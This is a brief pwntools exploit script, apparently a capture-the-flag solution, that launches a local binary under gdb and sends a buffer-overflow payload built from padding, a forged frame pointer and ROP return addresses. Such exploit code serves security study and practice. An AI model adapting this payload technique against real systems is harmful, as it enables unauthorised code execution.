from pwn import *

io = process("./easyeasy_h8")
gdb.attach(io)
pause()
pop_rdi = 0x0000000000400c13
pop_rsi_r15 = 0x0000000000400c11 
retn = 0x004022BC
io.sendline(b"\x00"*16 + p64(0x604000-0x10) + p64(retn-1) + p64(retn) * 5)
io.interactive()